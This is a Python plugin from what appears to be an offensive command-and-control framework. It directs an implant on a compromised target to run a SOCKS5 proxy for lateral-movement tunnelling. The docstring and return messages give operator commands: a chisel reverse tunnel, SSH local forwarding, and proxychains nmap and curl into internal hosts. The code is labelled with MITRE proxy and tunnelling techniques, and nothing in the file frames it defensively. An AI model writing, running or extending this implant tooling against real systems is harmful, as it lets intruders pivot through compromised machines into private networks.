"""
socks_proxy — in-process SOCKS5 proxy operator plugin

Starts a SOCKS5 listener inside the implant process bound to 127.0.0.1 on the
target.  Use an SSH local-forward or Chisel to expose it to the operator:

    # On operator, assuming Chisel is already on the target:
    chisel client <target>:8080 R:1080:127.0.0.1:1080

Then point any SOCKS5-capable tool at 127.0.0.1:1080 on the operator machine:
    proxychains4 -q nmap -sV ...
    curl --socks5-hostname 127.0.0.1:1080 http://internal.corp/
    Burp Suite -> SOCKS5 upstream proxy -> 127.0.0.1:1080

The implant side is implemented in implant/src/commands.c (cmd_socks_start,
cmd_socks_stop, cmd_socks_poll).

MITRE: T1090 (Proxy), T1572 (Protocol Tunneling)
"""

from fitnah.sdk.base_plugin import BasePlugin
from fitnah.sdk.context import PluginContext
from fitnah.sdk.result import ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class SocksProxy(BasePlugin):
    NAME        = "socks_proxy"
    DESCRIPTION = (
        "In-process SOCKS5 proxy inside the implant — start/stop/poll "
        "a 127.0.0.1 listener on the target for lateral-movement tunnelling"
    )
    MITRE       = "T1090,T1572"
    CATEGORY    = "lateral_movement"

    schema = ParamSchema().add(
        Param("action", str, required=True,
              help="start | stop | poll"),
        Param("port",   int, required=False, default=1080,
              help="TCP port for the SOCKS5 listener (default 1080)"),
    )

    def run(self, session, params, ctx: PluginContext = None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "").lower()

        if action == "start":
            port = int(params.get("port", 1080))
            r = ctx.send("socks_start", {"port": port})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "socks_start failed"))
            return ModuleResult.ok(
                data=(
                    f"{r.get('output', '')}\n\n"
                    f"Proxy running on target at 127.0.0.1:{port}\n"
                    f"Forward with:  ssh -L {port}:127.0.0.1:{port} <target>\n"
                    f"Then use:      proxychains4 -q <tool> ..."
                )
            )

        elif action == "stop":
            r = ctx.send("socks_stop", {})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "socks_stop failed"))
            return ModuleResult.ok(data=r.get("output", ""))

        elif action == "poll":
            r = ctx.send("socks_poll", {})
            if r.get("status") != "ok":
                return ModuleResult.err(r.get("output", "socks_poll failed"))
            return ModuleResult.ok(data=r.get("output", ""))

        else:
            return ModuleResult.err(
                f"Unknown action '{action}'. Choose: start, stop, poll"
            )
